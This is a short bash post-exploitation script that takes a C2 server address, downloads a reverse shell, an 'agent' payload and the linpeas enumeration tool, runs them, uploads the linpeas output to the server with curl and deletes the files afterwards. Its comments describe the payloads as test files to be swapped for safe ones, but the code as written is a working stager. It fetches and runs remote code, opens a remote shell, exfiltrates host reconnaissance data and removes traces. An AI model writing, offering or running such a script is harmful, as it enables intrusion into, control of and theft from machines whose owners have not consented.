#!/bin/bash

# Usage: ./script.sh <C2_IP_or_Server_IP>
# This script downloads test files and logs output locally.

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <server_ip>"
    exit 1
fi

SERVER_IP="$1"

# Example "linpeas" and "agent" files - replace with safe local/test files
wget "http://$SERVER_IP/linpeas" -O linpeas || { echo "Failed to download linpeas"; exit 1; }
wget "http://$SERVER_IP/payloads/agent" -O agent || { echo "Failed to download agent"; exit 1; }
wget "http://$SERVER_IP/payloads/revshell" -O revshell || { echo "Failed to download agent"; exit 1; }

# Make files executable
chmod +x agent linpeas revshell

# Run reverse shell
./revshell || { echo "Revshell failed"; exit 1; }

# Run agent (replace with safe test script)
./agent || { echo "Agent failed"; exit 1; }

# Run linpeas with safe test parameters and save output
HOSTNAME=$(hostname)
./linpeas -a -q | tee "${HOSTNAME}_linpeas.txt"

# Example: send file somewhere (replace with safe test server)
curl -F "file=@${HOSTNAME}_linpeas.txt" "http://$SERVER_IP:8080/p"

# Clean up
rm linpeas ${HOSTNAME}_linpeas.txt

